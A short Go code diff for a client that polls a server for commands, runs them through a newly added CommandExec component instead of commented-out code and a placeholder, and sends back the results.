@@ -17,12 +17,13 @@ import (
 var ErrNoCommandsFound = errors.New("Server did not return any commands")
 
 type Client struct {
-	port       int
-	computerId string
+	port        int
+	computerId  string
+	commandExec CommandExec
 }
 
 func NewClient(port int) Client {
-	w := Client{port, uuid.New().String()}
+	w := Client{port, uuid.New().String(), MakeCommandExec()}
 	return w
 }
 
@@ -56,15 +57,14 @@ func (s Client) requestAndExecute() {
 		return
 	}
 
-	/*err = command.Execute()
+	err = s.commandExec.execute(&command)
 	if err != nil {
 		log.WithFields(log.Fields{
 			"command": command,
 			"error":   err,
 		}).Info("Error executing command")
 		return
-	}*/
-	command.Response["asdf"] = "xxx"
+	}
 
 	err = s.sendCommand(command)
 	if err != nil {
